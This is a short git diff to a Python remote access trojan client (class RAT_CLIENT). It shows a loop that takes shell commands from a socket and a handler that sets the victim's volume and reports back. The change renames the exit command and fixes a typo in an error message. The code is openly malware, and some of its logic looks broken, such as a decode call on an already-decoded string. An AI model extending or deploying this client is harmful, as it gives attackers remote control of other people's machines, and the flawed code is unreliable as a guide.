@@ -99,7 +99,7 @@ class RAT_CLIENT:
             if command == 'shell':
                 while 1:
                     command = s.recv(2048).decode()
-                    if command.lower() == 'exit':
+                    if command.lower() == 'q':
                         break
                     if command == 'cd':
                         os.chdir(command[3:].decode('utf-8'))
@@ -230,7 +230,7 @@ class RAT_CLIENT:
                         volume.GetVolumeRange()[1], None)
                     s.send("Volume is increased to 100%".encode())
                 except:
-                    s.send("Module is not founded".encode())
+                    s.send("Module is not found".encode())
 
             elif command == 'volumedown':
                 try:
